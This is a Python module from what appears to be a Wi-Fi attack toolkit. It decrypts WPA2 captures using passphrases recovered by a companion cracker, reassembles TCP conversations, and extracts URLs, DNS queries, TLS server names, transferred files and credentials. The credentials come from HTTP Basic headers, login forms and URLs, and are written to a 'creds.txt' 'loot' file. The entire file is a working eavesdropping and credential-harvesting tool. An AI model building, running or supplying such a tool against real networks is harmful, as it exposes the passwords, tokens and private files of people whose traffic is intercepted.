"""Decrypt a pile of captures and pull the useful material out of them.

``wifi.decrypt`` proves a single PSK against a single handshake and writes raw
plaintext lines. That is enough to *see* traffic, not enough to work with it:
frames arrive interleaved, split across retransmissions, and the interesting
parts (URLs, credentials, file transfers, SNI) live above the frame layer.

This module is the batch side of the same pure-stdlib decrypter:

* feed it many captures (paths, globs or a directory) and many keys at once —
  a ``.txt`` of ``ssid:psk`` lines, the ``psk_*.txt`` files the cracker already
  wrote, or one key per AP;
* every association gets its own TK, so unrelated traffic in the same capture
  does not taint the one you hold a key for;
* TCP is reassembled per direction before anything is parsed, so an HTTP body
  split over ten frames still arrives whole;
* then it extracts: URLs and Host headers, DNS questions, TLS SNI, Basic and
  form credentials, and files by magic/Content-Type, plus a manifest.

Everything except the CCMP call itself is a pure function over bytes, so the
parsers are testable without a capture or a radio.
"""

from __future__ import annotations

import base64
import glob
import json
import os
import re
import struct

from omni.wifi import ccmp, pcapread, wpa

__all__ = ["load_keys", "expand_inputs", "sniff", "parse_http", "parse_dns",
           "parse_sni", "basic_auth", "form_creds", "url_creds",
           "Stream", "collect", "extract"]

#: magic byte prefix -> extension, for bodies worth keeping
MAGIC = (
    (b"\x89PNG\r\n\x1a\n", ".png"),
    (b"\xff\xd8\xff", ".jpg"),
    (b"GIF87a", ".gif"),
    (b"GIF89a", ".gif"),
    (b"%PDF-", ".pdf"),
    (b"PK\x03\x04", ".zip"),
    (b"\x1f\x8b", ".gz"),
    (b"7z\xbc\xaf\x27\x1c", ".7z"),
    (b"\x7fELF", ".elf"),
    (b"SQLite format 3\x00", ".sqlite"),
    (b"OggS", ".ogg"),
    (b"ID3", ".mp3"),
    (b"MZ", ".exe"),
)

#: bodies smaller than this are not worth writing to disk
KEEP_BYTES = 64

#: form/query keys that usually carry a secret
SECRET_KEYS = ("password", "passwd", "pwd", "pass", "secret", "token",
               "api_key", "apikey", "auth", "email", "user", "username",
               "login", "userid", "user_id", "account")

#: TCP ports treated as plaintext HTTP
HTTP_PORTS = (80, 8080, 8000, 8888, 3128, 5000, 9000)

_URL_RE = re.compile(rb"\bhttps?://[^\s\"'<>]{4,200}")


def sniff(body: bytes) -> str:
    """Extension for a body that starts with a known magic signature."""
    for signature, suffix in MAGIC:
        if body.startswith(signature):
            return suffix
    return ""


def load_keys(text: str) -> dict[str, str]:
    """Parse ``ssid:psk`` / ``bssid:psk`` lines (tolerant of BSSIDs)."""
    keys: dict[str, str] = {}
    for line in (text or "").replace("\x00", "").splitlines():
        line = line.strip().lstrip("\ufeff")
        if not line or line.startswith("#"):
            continue
        if line.count(":") > 1:                 # a BSSID: keep the last colon
            name, _, psk = line.rpartition(":")
        elif ":" in line:
            name, _, psk = line.partition(":")
        else:
            continue
        name, psk = name.strip(), psk.strip()
        if name and psk:
            keys[name.upper()] = psk
            keys[name] = psk
    return keys


def read_text(path: str) -> str:
    """Read a keys file whatever encoding it was saved in (BOM, UTF-16, LF)."""
    with open(path, "rb") as fh:
        raw = fh.read()
    for encoding in ("utf-8-sig", "utf-16", "utf-16-le", "latin-1"):
        try:
            text = raw.decode(encoding)
        except UnicodeDecodeError:
            continue
        if "\x00" not in text:
            return text
    return raw.decode("utf-8", "replace").replace("\x00", "")


def expand_inputs(spec: str) -> list[str]:
    """Turn a comma/space list, globs or directories into capture paths."""
    out: list[str] = []
    for chunk in re.split(r"[,\s]+", spec or ""):
        if not chunk:
            continue
        path = os.path.expanduser(chunk)
        if os.path.isdir(path):
            out += sorted(glob.glob(os.path.join(path, "*.pcap")))
            out += sorted(glob.glob(os.path.join(path, "*.cap")))
        elif any(mark in path for mark in "*?["):
            out += sorted(glob.glob(path))
        elif os.path.isfile(path):
            out.append(path)
    seen, unique = set(), []
    for path in out:
        if path not in seen:
            seen.add(path)
            unique.append(path)
    return unique


def parse_http(blob: bytes) -> dict:
    """Split an HTTP message into start line, headers and body (tolerant)."""
    head, _, body = blob.partition(b"\r\n\r\n")
    if not body:
        head, _, body = blob.partition(b"\n\n")
    lines = head.replace(b"\r\n", b"\n").split(b"\n")
    start = lines[0].decode("latin-1", "replace") if lines else ""
    headers: dict[str, str] = {}
    for line in lines[1:]:
        name, _, value = line.partition(b":")
        if value:
            headers[name.strip().lower().decode("latin-1", "replace")] = (
                value.strip().decode("latin-1", "replace"))
    return {"start": start, "headers": headers, "body": body}


def parse_dns(blob: bytes) -> list[str]:
    """Question names out of a DNS payload (queries and responses)."""
    if len(blob) < 13:
        return []
    count = struct.unpack(">H", blob[4:6])[0]
    offset, names = 12, []
    for _ in range(min(count, 32)):
        labels = []
        while offset < len(blob):
            length = blob[offset]
            offset += 1
            if not length:
                break
            if length & 0xC0 == 0xC0:         # compression pointer
                offset += 1
                break
            labels.append(blob[offset:offset + length]
                          .decode("latin-1", "replace"))
            offset += length
        offset += 4                            # QTYPE + QCLASS
        if labels:
            names.append(".".join(labels))
    return names


def parse_sni(blob: bytes) -> str:
    """Server name out of a TLS ClientHello, without touching the crypto.

    Walks every ``00 00`` and accepts one only when the surrounding lengths
    cross-check (``ext_len == name_len + 5``, ``list_len == name_len + 3``, and
    a host_name type of 0). Zero padding matches ``00 00`` constantly, so the
    arithmetic is what separates a real extension from filler.
    """
    if not blob or blob[0] != 0x16:
        return ""
    start = blob.find(b"\x00\x00")
    while start != -1:
        if start + 9 <= len(blob) and blob[start + 6] == 0x00:
            declared = struct.unpack(">H", blob[start + 7:start + 9])[0]
            ext_len = struct.unpack(">H", blob[start + 2:start + 4])[0]
            list_len = struct.unpack(">H", blob[start + 4:start + 6])[0]
            if (3 < declared < 200 and ext_len == declared + 5
                    and list_len == declared + 3):
                name = blob[start + 9:start + 9 + declared]
                if len(name) == declared and b"." in name and all(
                        0x21 <= b <= 0x7E for b in name):
                    return name.decode("latin-1", "replace")
        start = blob.find(b"\x00\x00", start + 1)
    return ""


def basic_auth(blob: bytes) -> list[tuple[str, str]]:
    """``Authorization: Basic`` pairs decoded out of a message."""
    out = []
    for match in re.finditer(rb"(?i)authorization:\s*basic\s+([A-Za-z0-9+/=]+)",
                             blob):
        try:
            user, _, pwd = base64.b64decode(match.group(1)).partition(b":")
        except (ValueError, TypeError):
            continue
        if user:
            out.append((user.decode("latin-1", "replace"),
                        pwd.decode("latin-1", "replace")))
    return out


def form_creds(blob: bytes) -> list[tuple[str, str]]:
    """user=...&pass=... pairs out of a form body or query string."""
    found: dict[str, str] = {}
    for field, value in re.findall(rb"(?i)([\w.-]{2,32})=([^&\s\r\n]{1,120})",
                                  blob):
        name = field.decode("latin-1", "replace").lower()
        if any(secret in name for secret in SECRET_KEYS):
            found[name] = value.decode("latin-1", "replace")
    user = next((found[k] for k in found
                 if "user" in k or "login" in k or "email" in k
                 or "account" in k), "")
    pwd = next((found[k] for k in found if any(
        s in k for s in ("pass", "pwd", "secret", "token", "key"))), "")
    return [(user, pwd)] if user or pwd else []


def url_creds(url: str) -> list[tuple[str, str]]:
    """``user:pass@host`` credentials embedded in a URL."""
    match = re.match(r"\w+://([^/@:]+):([^/@]+)@", url or "")
    return [(match.group(1), match.group(2))] if match else []


# ---------------------------------------------------------------------------
# reassembly
# ---------------------------------------------------------------------------

class Stream:
    """One TCP conversation, reassembled per direction from decrypted frames."""

    def __init__(self, key: tuple, client: tuple, server: tuple):
        self.key = key
        self.client = client                     # (ip, port) of the station
        self.server = server
        self._req: dict[int, bytes] = {}
        self._resp: dict[int, bytes] = {}

    def feed(self, to_server: bool, seq: int, payload: bytes) -> None:
        """Insert a segment; exact retransmissions collapse on the seq key."""
        store = self._req if to_server else self._resp
        store.setdefault(seq, payload)

    def _join(self, store: dict[int, bytes]) -> bytes:
        out, cursor = [], None
        for seq in sorted(store):
            if cursor is not None and seq > cursor:
                break                            # gap: stop at the hole
            out.append(store[seq])
            cursor = seq + len(store[seq])
        return b"".join(out)

    @property
    def request(self) -> bytes:
        return self._join(self._req)

    @property
    def response(self) -> bytes:
        return self._join(self._resp)

    @property
    def is_http(self) -> bool:
        return self.server[1] in HTTP_PORTS or self.request[:8].startswith(
            (b"GET ", b"POST ", b"PUT ", b"HEAD ", b"DELETE ", b"PATCH "))

    def label(self) -> str:
        return (f"{self.client[0]}:{self.client[1]} -> "
                f"{self.server[0]}:{self.server[1]}")


def _addresses(frame: bytes) -> tuple[bytes, bytes] | None:
    """(ap, station) for a data frame, from the ToDS/FromDS bits.

    A1 is the receiver, A2 the transmitter: to the AP the BSSID is A1 and the
    station A2, from the AP it is the other way round.
    """
    fc1 = frame[1]
    to_ds, from_ds = fc1 & 0x01, fc1 & 0x02
    if to_ds and not from_ds:
        return frame[4:10], frame[10:16]         # A1=BSSID, A2=SA
    if from_ds and not to_ds:
        return frame[10:16], frame[4:10]         # A2=BSSID, A1=DA
    return None


def _inner(body: bytes) -> tuple[int, bytes, bytes, bytes] | None:
    """(proto, src, dst, payload) from a decrypted LLC/SNAP frame, IPv4 only."""
    if len(body) < 8 or not body.startswith(b"\xaa\xaa\x03\x00\x00\x00"):
        return None
    ethertype = struct.unpack(">H", body[6:8])[0]
    packet = body[8:]
    if ethertype != 0x0800 or len(packet) < 20:
        return None
    header_len = (packet[0] & 0x0F) * 4
    proto = packet[9]
    if proto not in (6, 17) or len(packet) < header_len + 4:
        return None
    return proto, packet[12:16], packet[16:20], packet[header_len:]


def _tcp(payload: bytes) -> tuple[int, int, bytes] | None:
    """(sport, seq, body) from a TCP segment."""
    if len(payload) < 20:
        return None
    sport, dport = struct.unpack(">HH", payload[0:4])
    seq = struct.unpack(">I", payload[4:8])[0]
    offset = (payload[12] >> 4) * 4
    if offset < 20 or len(payload) <= offset:
        return None
    return sport, seq, payload[offset:]


def _udp(payload: bytes) -> tuple[int, int, bytes] | None:
    """(sport, dport, body) from a UDP datagram."""
    if len(payload) < 8:
        return None
    sport, dport = struct.unpack(">HH", payload[0:4])
    return sport, dport, payload[8:]


# ---------------------------------------------------------------------------
# the run
# ---------------------------------------------------------------------------

class Report:
    """Everything a run produced, plus the counters worth printing."""

    def __init__(self) -> None:
        self.captures: list[str] = []
        self.skipped: list[tuple[str, str]] = []
        self.streams: list[Stream] = []
        self.dns: list[str] = []
        self.sni: list[str] = []
        self.urls: list[str] = []
        self.creds: list[tuple[str, str, str]] = []      # (source, user, pass)
        self.files: list[tuple[str, int]] = []           # (path, bytes)
        self.frames = 0
        self.max_files = 0                               # 0 = no cap

    def as_dict(self) -> dict:
        return {"captures": self.captures, "skipped": self.skipped,
                "frames": self.frames, "streams": len(self.streams),
                "dns": self.dns, "sni": self.sni, "urls": self.urls,
                "creds": [list(c) for c in self.creds],
                "files": [list(f) for f in self.files]}


def _key_for(handshake, keys: dict[str, str]) -> str:
    """A usable passphrase for this handshake, or "" when we hold none."""
    bssid = handshake.bssid.upper()
    if bssid in keys:
        return keys[bssid]
    return keys.get(handshake.ssid.decode("utf-8", "replace"), "")


def collect(path: str, keys: dict[str, str], report: Report) -> None:
    """Decrypt one capture into streams; unkeyed associations are skipped."""
    tks: dict[tuple[bytes, bytes], bytes] = {}
    for handshake in pcapread.find_handshakes(path):
        passphrase = _key_for(handshake, keys)
        if not passphrase:
            report.skipped.append((path, f"no key for {handshake.bssid}"))
            continue
        if not handshake.ssid:
            report.skipped.append((path, f"{handshake.bssid}: SSID unknown"))
            continue
        if not handshake.verify(passphrase):
            report.skipped.append((path, f"{handshake.bssid}: PSK mismatch"))
            continue
        derived = wpa.ptk(wpa.pmk(passphrase, handshake.ssid), handshake.ap,
                          handshake.sta, handshake.a_nonce, handshake.s_nonce,
                          512)
        tks[(handshake.ap, handshake.sta)] = derived[32:48]
    if not tks:
        return
    report.captures.append(path)

    streams: dict[tuple, Stream] = {}
    for frame, body in pcapread.data_frames(path):
        pair = _addresses(frame)
        if pair is None:
            continue
        tk = tks.get(pair) or tks.get((pair[1], pair[0]))
        if tk is None:
            continue
        try:
            pn, cipher, _key_id = ccmp.split_ccmp_body(body)
            plain = ccmp.ccmp_decrypt(
                cipher, tk, ccmp.ccmp_nonce(0, frame[10:16], pn),
                ccmp.ccmp_aad(frame))
        except Exception:                        # noqa: BLE001 - skip frame
            continue
        inner = _inner(plain)
        if inner is None:
            continue
        proto, src, dst, payload = inner
        if proto == 17:
            udp = _udp(payload)
            if udp and 53 in (udp[0], udp[1]):
                report.dns += parse_dns(udp[2])
            continue
        tcp = _tcp(payload)
        if tcp is None:
            continue
        sport, seq, chunk = tcp
        to_server = bool(frame[1] & 0x01)        # ToDS: station -> distribution
        if to_server:
            client, server = (src, sport), (dst, tcp[0])
        else:
            client, server = (dst, tcp[0]), (src, sport)
        key = (src, dst, sport, tcp[0])
        stream = streams.setdefault(key, Stream(key, client, server))
        stream.feed(to_server, seq, chunk)
        report.frames += 1
    report.streams += list(streams.values())


def _analyse(stream: Stream, report: Report, out: str) -> None:
    """Pull URLs, SNI, credentials and files out of one conversation."""
    request, response = stream.request, stream.response
    if not request and not response:
        return
    if stream.is_http:
        http = parse_http(request or response)
        report.urls += [m.decode("latin-1", "replace")
                        for m in _URL_RE.findall(request)]
        start_line = http["start"].split(" ")
        target = start_line[1] if len(start_line) > 1 else ""
        host = http["headers"].get("host", "")
        if host:
            report.urls.append("http://" + host)
            if target.startswith("/"):
                report.urls.append(f"http://{host}{target}")
        for url in report.urls[-8:]:
            for user, pwd in url_creds(url):
                report.creds.append(("url", user, pwd))
        for user, pwd in basic_auth(request):
            report.creds.append(("basic", user, pwd))
        for user, pwd in form_creds(http["body"] + b"&" + target.encode()):
            report.creds.append(("form", user, pwd))
        body = http["body"] or response.partition(b"\r\n\r\n")[2]
        suffix = sniff(body)
        if not suffix:
            ctype = parse_http(response)["headers"].get("content-type", "")
            suffix = (".html" if "html" in ctype else
                      ".json" if "json" in ctype else
                      ".bin" if body else "")
        if suffix and len(body) >= KEEP_BYTES and (
                not report.max_files or len(report.files) < report.max_files):
            folder = os.path.join(out, "files")
            os.makedirs(folder, exist_ok=True)
            path = os.path.join(folder, f"{len(report.files) + 1:04d}{suffix}")
            with open(path, "wb") as fh:
                fh.write(body)
            report.files.append((path, len(body)))
    sni = parse_sni(request)
    if sni:
        report.sni.append(sni)

    folder = os.path.join(out, "streams")
    os.makedirs(folder, exist_ok=True)
    path = os.path.join(folder, f"{len(report.streams):04d}.txt")
    with open(path, "wb") as fh:
        fh.write(b"# " + stream.label().encode() + b"\n\n")
        fh.write(b"--- request ---\n" + request + b"\n\n--- response ---\n")
        fh.write(response)


def _write_report(report: Report, out: str) -> None:
    """creds.txt / urls.txt / dns.txt / manifest.json next to the loot."""
    os.makedirs(out, exist_ok=True)
    if report.creds:
        with open(os.path.join(out, "creds.txt"), "w", encoding="utf-8",
                  newline="\n") as fh:
            for source, user, pwd in report.creds:
                fh.write(f"{source}\t{user}\t{pwd}\n")
    for name, values in (("urls.txt", report.urls), ("dns.txt", report.dns),
                         ("sni.txt", report.sni)):
        if values:
            with open(os.path.join(out, name), "w", encoding="utf-8",
                      newline="\n") as fh:
                fh.write("\n".join(values) + "\n")
    with open(os.path.join(out, "manifest.json"), "w", encoding="utf-8",
              newline="\n") as fh:
        json.dump(report.as_dict(), fh, indent=2)
        fh.write("\n")


def extract(paths: list[str], keys: dict[str, str], out: str,
            max_files: int = 0) -> Report:
    """Run the pipeline over many captures and write the loot."""
    report = Report()
    report.max_files = max(0, max_files)
    for path in paths:
        try:
            collect(path, keys, report)
        except (pcapread.PcapError, OSError) as exc:
            report.skipped.append((path, str(exc)))
    for stream in report.streams:
        _analyse(stream, report, out)
    _write_report(report, out)
    return report
